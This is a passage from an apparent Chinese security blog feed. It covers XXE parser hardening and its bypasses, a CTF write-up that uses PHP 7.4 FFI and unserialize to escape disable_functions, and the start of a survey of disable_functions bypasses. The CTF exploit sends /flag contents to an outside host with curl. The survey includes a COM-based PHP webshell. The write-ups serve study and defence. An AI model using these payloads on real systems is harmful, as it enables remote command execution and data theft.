2.3.0</td></tr></tbody></table><p>我们可以以之前DocumentBuilder的Demo为例，只调用setFeature()将该特性设置为true，然后会发现，只要在XML中尝试定义DOCTYPE的都会报错，因此便不支持解析DTD了，更不用谈后续的利用：</p><p><img src="/2019/06/09/探讨XXE防御之setFeature设置/1.png" alt=""></p><h4 id="external-general-entities"><a href="#external-general-entities" class="headerlink" title="external-general-entities"></a>external-general-entities</h4><p>该特性指定是否包含外部生成的实体，当设置为false时，不支持解析外部实体。</p><p>如果你不能完全禁用DTD，建议开启该特性。</p><p><strong><a href="http://xml.org/sax/features/external-general-entities" target="_blank" rel="noopener">http://xml.org/sax/features/external-general-entities</a></strong></p><table><thead><tr><th><strong>True:</strong></th><th>Include external general entities.</th></tr></thead><tbody><tr><td><strong>False:</strong></td><td>Do not include external general entities.</td></tr><tr><td><strong>Default:</strong></td><td>true</td></tr><tr><td><strong>Access:</strong></td><td>(parsing) read-only; (not parsing) read-write;</td></tr><tr><td><strong>See:</strong></td><td><a href="http://xerces.apache.org/xerces2-j/features.html#external-parameter-entities" target="_blank" rel="noopener">http://xml.org/sax/features/external-parameter-entities</a></td></tr></tbody></table><p>还是之前的例子，只调用setFeature()将该特性设置为false，先尝试解析内部实体，是OK的：</p><p><img src="/2019/06/09/探讨XXE防御之setFeature设置/2.png" alt=""></p><p>再尝试解析外部实体时，虽然会发送外部请求，但是在SYSTEM解析时就会报错了：</p><p><img src="/2019/06/09/探讨XXE防御之setFeature设置/3.png" alt=""></p><h4 id="external-parameter-entities"><a href="#external-parameter-entities" class="headerlink" title="external-parameter-entities"></a>external-parameter-entities</h4><p>该特性指定是否包含外部的参数，包括外部DTD子集。当设置为false时，不支持外部参数实体及外部DTD子集。</p><p><strong><a href="http://xml.org/sax/features/external-parameter-entities" target="_blank" rel="noopener">http://xml.org/sax/features/external-parameter-entities</a></strong></p><table><thead><tr><th><strong>True:</strong></th><th>Include external parameter entities and the external DTD subset.</th></tr></thead><tbody><tr><td><strong>False:</strong></td><td>Do not include external parameter entities or the external DTD subset.</td></tr><tr><td><strong>Default:</strong></td><td>true</td></tr><tr><td><strong>Access:</strong></td><td>(parsing) read-only; (not parsing) read-write;</td></tr><tr><td><strong>See:</strong></td><td><a href="http://xerces.apache.org/xerces2-j/features.html#external-general-entities" target="_blank" rel="noopener">http://xml.org/sax/features/external-general-entities</a></td></tr></tbody></table><p>接上一小节的示例，解析外部普通实体时，是可以成功利用的，不存在报错：</p><p><img src="/2019/06/09/探讨XXE防御之setFeature设置/4.png" alt=""></p><p>但是换种形式，当解析外部参数实体时，就会报错了：</p><p><img src="/2019/06/09/探讨XXE防御之setFeature设置/5.png" alt=""></p><h4 id="load-external-dtd"><a href="#load-external-dtd" class="headerlink" title="load-external-dtd"></a>load-external-dtd</h4><p>当设置为false时，禁用外部DTD。</p><p><strong><a href="http://apache.org/xml/features/nonvalidating/load-external-dtd" target="_blank" rel="noopener">http://apache.org/xml/features/nonvalidating/load-external-dtd</a></strong></p><table><thead><tr><th><strong>True:</strong></th><th>Load the external DTD.</th></tr></thead><tbody><tr><td><strong>False:</strong></td><td>Ignore the external DTD completely.</td></tr><tr><td><strong>Default:</strong></td><td>true</td></tr><tr><td><strong>Note:</strong></td><td>This feature is always on when validation is on.</td></tr><tr><td><strong>See:</strong></td><td><a href="http://xerces.apache.org/xerces2-j/features.html#validation" target="_blank" rel="noopener">http://xml.org/sax/features/validation</a></td></tr><tr><td><strong>See:</strong></td><td><a href="http://xerces.apache.org/xerces2-j/features.html#nonvalidating.load-dtd-grammar" target="_blank" rel="noopener">http://apache.org/xml/features/nonvalidating/load-dtd-grammar</a></td></tr></tbody></table><p>接着上一小节的示例，尝试解析外部参数实体，是ok的：</p><p><img src="/2019/06/09/探讨XXE防御之setFeature设置/6.png" alt=""></p><p>但是换成解析外部普通实体时，就报错了：</p><p><img src="/2019/06/09/探讨XXE防御之setFeature设置/7.png" alt=""></p><h3 id="Bypass小结"><a href="#Bypass小结" class="headerlink" title="Bypass小结"></a>Bypass小结</h3><p>配置补全或出错，如disallow-doctype-decl设置为false等，相当于没防御，看情况而定。</p><p>下面就单一的几种设置看看，具体几种的组合的Bypass自行考虑即可：</p><ul><li>如果disallow-doctype-decl设置为true，无法Bypass；</li><li>如果external-general-entities设置为false，则只能解析内部实体而无法解析外部实体，此时能利用的只有XXE DoS攻击，但要看具体的JDK版本；</li><li>如果external-parameter-entities设置为false，则解析内部实体、外部普通实体而无法解析外部参数实体，此时可以进行外部普通实体的形式来攻击或者XXE DoS；</li><li>如果load-external-dtd设置为false，则解析内部实体、外部参数实体而无法解析外部普通实体，此时可以进行外部参数实体的形式来攻击或者XXE DoS；</li></ul><h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p><a href="http://xerces.apache.org/xerces2-j/features.html" target="_blank" rel="noopener">Feature</a></p><p><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md" target="_blank" rel="noopener">XML_External_Entity_Prevention_Cheat_Sheet</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
      <category term="XML注入" scheme="https://Mi1k7ea.github.com/tags/XML%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>从RCTF nextphp看PHP7.4的FFI绕过disable_functions</title>
    <link href="https://Mi1k7ea.github.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/"/>
    <id>https://Mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/</id>
    <published>2019-06-07T08:27:45.000Z</published>
    <updated>2019-06-07T10:00:41.229Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><p>访问页面，显示源码，是个PHP一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>推测，考察Bypass disable_functions。</p><p>通过<code>?a=phpinfo();</code>查看phpinfo，发现PHP版本为7.4，且open_basedir限制为Web目录：</p><p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/1.png" alt=""></p><p>而disable_functions中不仅过滤了所有PHP命令执行函数，还过滤了mail、dl、putenv等函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br></pre></td></tr></table></figure><p>Bypass disable_functions的方法无非就那几种。黑名单是无法绕过了，因为所有PHP命令执行函数都被严格过滤了；系统是Linux，不存在COM组件绕过；过滤了dl()函数，无法通过扩展库绕过；过滤了mail和putenv等函数，无法通过LD_PRELOAD方式绕过；过滤了pcntl相关函数，无法通过该组件绕过；系统没有ImageMagick组件等等……</p><p>暂时没有思路，那就看下当前Web目录下有啥文件，此时只能查看Web目录，因为open_basedir限制了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=print_r(scandir(&apos;./&apos;));</span><br></pre></td></tr></table></figure><p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/2.png" alt=""></p><p>可以看到有个preload.php。</p><p>难道就没办法Bypass open_basedir了吗？——<strong>使用glob://伪协议</strong></p><p>下面通过glob://伪协议来Bypass open_basedir读取根目录有啥内容，发送之前先进行URL编码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">' '</span>);&#125;;</span><br></pre></td></tr></table></figure><p>可以看到根目录下有个flag，这里读是读不到的，但是已经确定了flag在根目录下：</p><p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/3.png" alt=""></p><p>回到之前，看下preload.php的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a=show_source(&apos;preload.php&apos;);</span><br><span class="line">?a=echo(readfile(&apos;preload.php&apos;));</span><br><span class="line">?a=print_r(readfile(&apos;preload.php&apos;));</span><br><span class="line">?a=echo(file_get_contents(&apos;preload.php&apos;));</span><br><span class="line">?a=print_r(file_get_contents(&apos;preload.php&apos;));</span><br></pre></td></tr></table></figure><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析下这段代码：A类继承了Serializable类，和Java类似，定义了一个可序列化的类；A类有一个成员变量\$data，是一个数组，数组中是字典，键分别保存了ret、func、arg；新增了__serialize()和__unserialize()函数，未见过的写法，其中__unserialize()和unserialize()均调用了run()函数；__set()和__construct()函数都抛出异常，这里主要是__set()，因为我们无法直接通过set的方式来设置\$data的值了；最后是run()函数，它是反序列化漏洞存在的根源，因为它通过成员变量\$data中的func和arg来实现任意函数调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br></pre></td></tr></table></figure><p>至此，之前Bypass disable_functions的方法自然是用不了了。但题目是nextphp，PHP版本为7.4且根据其未见过的一些特性可以推测出应该是用到了7.4版本的新特性了。</p><h2 id="0x02-PHP-7-4-新特性"><a href="#0x02-PHP-7-4-新特性" class="headerlink" title="0x02 PHP 7.4 新特性"></a>0x02 PHP 7.4 新特性</h2><h3 id="自定义对象序列化"><a href="#自定义对象序列化" class="headerlink" title="自定义对象序列化"></a>自定义对象序列化</h3><p>在PHP 7.4的时候，增加了__serialize()和__unserialize()函数，可以用来自定义对象的序列化。其实和Java重写readObject()方法类似。</p><h3 id="Preload"><a href="#Preload" class="headerlink" title="Preload"></a>Preload</h3><p>预加载，允许服务器在启动时在内存中加载PHP文件，并使它们永久可用于所有后续请求，主要用来大幅提升IO性能。</p><p>在php.ini中有一项设置名为opcache.preload，用来指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用。</p><p>在本题的phpino中可以看到该设置选项：</p><p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/4.png" alt=""></p><p>可以看到，该选项设置为preload.php，也就是说服务器在启动时就已经将该文件加载进内存中，后续我们可以直接调用该文件中的类方法即可而无需做多余的操作去加载或包含文件进来。</p><h3 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h3><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。</p><p>FFI的使用分为声明和调用两个部分。</p><p>下面看个简单的使用Demo，从共享库中调用printf()函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create FFI object, loading libc and exporting function printf()</span></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int printf(const char *format, ...);"</span>, <span class="comment">// this is a regular C declaration</span></span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"><span class="comment">// call C's printf()</span></span><br><span class="line">$ffi-&gt;printf(<span class="string">"Hello %s!\n"</span>, <span class="string">"world"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>FFI::cdef——创建一个新的FFI对象，可以用于常规C代码的声明，第一个参数为需要声明的C代码，第二个参数为可选项、从哪个共享库中导入；后面直接通过FFI变量调用声明过的C函数即可。</p><p>可在phpinfo中查看FFI是否开启，本题是开启的：</p><p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/5.png" alt=""></p><h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>由前面分析可知以下几点可利用的地方：</p><ul><li>Preload配置已经将preload.php预加载到内存中，可直接利用其中的类方法；</li><li>preload.php中的unserialize()函数会调用run()，而run()存在任意函数调用风险；</li><li>index.php中eval会执行PHP代码，会帮助我们执行preload.php中的反序列化操作；</li></ul><p>结合起来，攻击思路如下：</p><ul><li>先利用FFI特性构造恶意序列化内容，用PHP通过FFI声明和调用C中的system()函数；</li><li>利用index.php中的eval来执行反序列化操作；</li><li>最后调用FFI中声明的system()函数执行命令；</li></ul><p>利用FFI的特性构造恶意序列化内容，因为无法直接通过__set()函数设置成员变量\$data，这里就直接修改其键值即可，使其初始化func的初始值为FFI::cdef、arg的初始值为system：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到如下序列化内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造exp如下，这里利用index.php的eval来限制执行反序列化操作，然后触发run()函数来调用FFI::cdef声明C中的system()函数，然后通过FFI变量调用已声明的system()来执行任意命令，因为可能有特殊编码这里就进行base64加密传送回来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=unserialize(<span class="string">'C:1:"A":89:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:26:"int system(char *command);";&#125;&#125;'</span>);$a-&gt;ret-&gt;system(<span class="string">'curl xx.ceye.io/?c=`cat /flag|base64`'</span>);</span><br></pre></td></tr></table></figure><p>发送之前，先进行URL编码，最后在ceye收到内容，base64解码即为flag：</p><p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/6.png" alt=""></p><p><strong>小结</strong></p><p>本题巧妙利用了PHP 7.4的新特性FFI来Bypass disable_functions。</p><p>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p><p>也就是说，通过PHP调用C的命令执行函数来绕过。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.php.net/manual/en/book.ffi.php" target="_blank" rel="noopener">Foreign Function Interface</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>浅谈几种Bypass disable_functions的方法</title>
    <link href="https://Mi1k7ea.github.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://Mi1k7ea.github.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/</id>
    <published>2019-06-02T10:07:10.000Z</published>
    <updated>2019-06-22T09:32:02.324Z</updated>
    
    <content type="html"><![CDATA[<p>Bypass disable_functions的方法有很多，这里先将一些常用的方法小结一下，后面会继续补充各种方法。</p><h2 id="0x01-disable-functions"><a href="#0x01-disable-functions" class="headerlink" title="0x01 disable_functions"></a>0x01 disable_functions</h2><p>disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。</p><p>我们查看phpinfo的时候，会发现有这么一栏，我本地这里默认是未设置的：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/1.png" alt=""></p><p>要更改的话打开php.ini，找到对应的行修改即可，这里修改如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; This directive allows you to disable certain functions for security reasons.</span></span><br><span class="line"><span class="comment">; It receives a comma-delimited list of function names.</span></span><br><span class="line"><span class="comment">; http://php.net/disable-functions</span></span><br><span class="line"><span class="attr">disable_functions</span> = exec,system,passthru,shell_exec,proc_open,popen,dl,</span><br></pre></td></tr></table></figure><p>注意：eval并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。</p><p>然后重启服务，在phpinfo中可以看到已经生效：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/2.png" alt=""></p><p>下面就逐一对各种方法进行简单的归纳。</p><h2 id="0x02-黑名单绕过"><a href="#0x02-黑名单绕过" class="headerlink" title="0x02 黑名单绕过"></a>0x02 黑名单绕过</h2><p>我们知道，disable_functions其实是一个黑名单机制，我们可以通过观察是否存在可利用的漏网之鱼，直接通过其实现绕过即可。</p><p>……</p><h2 id="0x03-利用Windows系统组件COM绕过"><a href="#0x03-利用Windows系统组件COM绕过" class="headerlink" title="0x03 利用Windows系统组件COM绕过"></a>0x03 利用Windows系统组件COM绕过</h2><p>Windows系统组件COM在Windows默认就存在，是位于System32目录下的wshom.ocx文件。</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>先在php.ini中查看是否已经开启com.allow_dcom，若未开启则将前面的;分号去掉：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; allow Distributed-COM calls</span></span><br><span class="line"><span class="comment">; http://php.net/com.allow-dcom</span></span><br><span class="line">com.allow_dcom = true</span><br></pre></td></tr></table></figure><p>然后在php/ext/里面查找是否存在php_com_dotnet.dll这个文件。</p><p>再到php.ini中查看是否存在extension=php_com_dotnet.dll这项，有的话去掉注释开启，否则直接添加上去即可。</p><p>重启服务，在phpinfo中查看是否开启了：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/3.png" alt=""></p><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>前提通过phpinfo知道disable_functions选项如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">disable_functions</span> = exec,system,passthru,shell_exec,proc_open,popen,dl,</span><br></pre></td></tr></table></figure><p>此时在Web服务器中写入任意的以上函数的WebShell都是无法执行命令的。</p><p>上传comshell.php至Web服务器中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c"</span>.$command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里创建一个COM对象，然后通过调用COM对象的exec()方法来实现执行系统命令，从而绕过disable_functions禁用PHP命令执行函数的限制：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/4.png" alt=""></p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>彻底的解决方案是直接删除System32目录下wshom.ocx文件。</p><h2 id="0x04-利用LD-PRELOAD绕过"><a href="#0x04-利用LD-PRELOAD绕过" class="headerlink" title="0x04 利用LD_PRELOAD绕过"></a>0x04 利用LD_PRELOAD绕过</h2><p>LD_PRELOAD是Linux中的环境变量，可以设置成一个指定库的路径，动态链接时较其他库有着更高的优先级，允许预加载指定库中的函数和符号覆盖掉后续链接的库中的函数和符号。即可以通过重定向共享库函数来进行运行时修复。这项技术可用于绕过反调试代码，也可以用作用户机rootkit。</p><h3 id="Method1——劫持getuid"><a href="#Method1——劫持getuid" class="headerlink" title="Method1——劫持getuid()"></a>Method1——劫持getuid()</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>前提是在Linux中已安装并启用sendmail程序。</p><p>php的mail()函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，而/usr/sbin/sendmail会调用getuid()。如果我们能通过LD_PRELOAD的方式来劫持getuid()，再用mail()函数来触发sendmail程序进而执行被劫持的getuid()，从而就能执行恶意代码了。</p><p>细化一下：</p><ul><li>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 evil.so；</li><li>运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 